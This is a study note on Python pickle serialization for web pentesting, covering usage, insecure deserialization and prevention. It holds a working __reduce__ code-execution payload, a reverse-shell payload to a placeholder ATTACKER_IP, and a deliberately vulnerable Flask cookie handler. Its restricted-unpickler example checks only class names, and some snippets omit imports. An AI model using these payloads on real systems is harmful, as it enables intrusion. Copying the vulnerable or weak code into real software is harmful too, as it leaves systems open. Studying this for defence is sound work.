2026-02-06 22:00

Status:

Tags: [[eWPTX]] [[Python]] [[Pickle]] [[Serialization]]
###### Prerequisites: [[What is Serialization?]] [[Insecure Deserialization]]
# Pickle (Python) Serialization

## Overview

**Pickle** is a Python module used for serializing and deserializing Python objects.

Pickle serialization converts a Python object into a byte stream that can be stored in a file, database, or transmitted over a network.

**Warning**: Pickle is **not secure** against erroneous or maliciously constructed data. Never unpickle data received from an untrusted source.

---

## How Pickle Works

### Serialization

`pickle.dump(obj, file)` or `pickle.dumps(obj)` converts a Python object into a byte stream.

```python
import pickle

# Example object
data = {"name": "Alice", "age": 30, "roles": ["admin", "user"]}

# Serialize to bytes
serialized_data = pickle.dumps(data)
print("Serialized Data:", serialized_data)
```

Output:

```
Serialized Data: b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x04name\x94\x8c\x05Alice\x94\x8c\x03age\x94K\x1e\x8c\x05roles\x94]\x94(\x8c\x05admin\x94\x8c\x04user\x94e.'
```

### Deserialization

`pickle.load(file)` or `pickle.loads(data)` reads the byte stream and recreates the original Python object.

```python
import pickle

# Deserialize from bytes
deserialized_data = pickle.loads(serialized_data)
print("Deserialized Data:", deserialized_data)
print("Name:", deserialized_data["name"])
print("Age:", deserialized_data["age"])
```

---

## Complete Example

```python
import pickle

# Example object
data = {"name": "Alice", "age": 30, "roles": ["admin", "user"]}

# Serialize the object
serialized_data = pickle.dumps(data)
print("Serialized Data:", serialized_data)

# Deserialize the object
deserialized_data = pickle.loads(serialized_data)
print("Deserialized Data:", deserialized_data)
```

---

## File Operations

### Writing Pickle Data

```python
import pickle

data = {"key": "value", "numbers": [1, 2, 3]}

# Write to file
with open("data.pkl", "wb") as f:
    pickle.dump(data, f)
```

### Reading Pickle Data

```python
import pickle

# Read from file
with open("data.pkl", "rb") as f:
    data = pickle.load(f)

print(data)
```

---

## Security Danger: Arbitrary Code Execution

Pickle can execute arbitrary code during deserialization because it allows objects to define how they should be reconstructed via `__reduce__` method.

### Malicious Payload Example

```python
import pickle
import os

class Malicious:
    def __reduce__(self):
        # This will execute when unpickling
        return (os.system, ('ls -la',))

# Create malicious payload
malicious_data = pickle.dumps(Malicious())

print("Malicious payload created")
print("Hex:", malicious_data.hex())

# When this is unpickled, the command executes
pickle.loads(malicious_data)
```

Output (command is executed):

```
Malicious payload created
Hex: 8003... (truncated)
total 32
drwxr-xr-x  4 user  staff   128 Feb  6 22:00 .
drwxr-xr-x  3 user  staff    96 Feb  6 22:00 ..
...
```

### Reverse Shell Payload

```python
import pickle
import base64

class ReverseShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],))

# Generate payload
payload = pickle.dumps(ReverseShell())
encoded = base64.b64encode(payload).decode()
print("Base64 payload:", encoded)
```

---

## Pickle Protocol Versions

Pickle supports different protocol versions (0-5):

```python
import pickle

data = {"test": "value"}

# Protocol 0 (ASCII, compatible with Python 2)
print(pickle.dumps(data, protocol=0))

# Protocol 4 (default in Python 3.8+)
print(pickle.dumps(data, protocol=4))

# Protocol 5 (Python 3.8+, supports out-of-band data)
print(pickle.dumps(data, protocol=5))
```

---

## Identifying Pickle Data

Pickle data has a distinctive signature:

- **Magic bytes**: `\x80\x03` or `\x80\x04` or `\x80\x05` (protocol version)
- Followed by opcodes like `}`, `(`, `)`, `.`

Example hex dump:

```
80 04 95 1e 00 00 00 00 00 00 00 } 94 ( 8c 04 name 94 ...
```

---

## Detection in Web Applications

### Cookie-based Pickle

```python
# Vulnerable Flask application
import pickle
from flask import Flask, request, make_response

app = Flask(__name__)

@app.route('/')
def home():
    session = request.cookies.get('session')
    if session:
        # DANGEROUS: Unpickling user input
        user_data = pickle.loads(base64.b64decode(session))
        return f"Hello {user_data.get('username')}"
    return "No session"

# Generate cookie
user = {"username": "admin", "role": "user"}
cookie_value = base64.b64encode(pickle.dumps(user)).decode()
```

---

## Exploitation Tools

### **pickle-decoder**

Online tool to decode and analyze pickle payloads:
- https://doyensec.com/blog/posts/pickle-decoder/

### **pwntools**

```python
from pwn import *

# Generate pickle payload
payload = pickle.dumps(Malicious())
```

---

## Prevention

### 1. Never Unpickle Untrusted Data

The safest approach: don't use pickle with data from external sources.

### 2. Use Safe Alternatives

```python
# Safer: JSON
import json
data = json.loads(user_input)

# Safer: MessagePack
import msgpack
data = msgpack.unpackb(user_input, raw=False)
```

### 3. Use Signed Serialization

```python
import hmac
import json
import hashlib

SECRET = b'your-secret-key'

def serialize(data):
    data_json = json.dumps(data).encode()
    signature = hmac.new(SECRET, data_json, hashlib.sha256).digest()
    return base64.b64encode(data_json + b'|' + signature).decode()

def deserialize(data):
    decoded = base64.b64decode(data)
    data_json, signature = decoded.rsplit(b'|', 1)
    expected = hmac.new(SECRET, data_json, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    return json.loads(data_json)
```

### 4. Restrict Classes (Advanced)

```python
import pickle

class SafeUnpickler(pickle.Unpickler):
    SAFE_CLASSES = {'dict', 'list', 'str', 'int', 'float', 'tuple'}

    def find_class(self, module, name):
        if name not in self.SAFE_CLASSES:
            raise pickle.UnpicklingError(f"Unsafe class: {module}.{name}")
        return super().find_class(module, name)

def safe_loads(data):
    return SafeUnpickler(data, encoding='bytes').load()
```

---

## Key Points

- Pickle can execute arbitrary code during deserialization
- Never unpickle data from untrusted sources
- Use JSON or other safe formats for external data
- If you must use pickle, implement signing/verification
- Detection: Look for base64-encoded data with `\x80` prefix

---

## References

- Python Pickle Documentation: https://docs.python.org/3/library/pickle.html
- "Pickle_RE" GitHub: https://github.com/alirdn/pickle_RE
- "Pickle Decompiler" GitHub: https://github.com/aaditya/pickle-decompiler
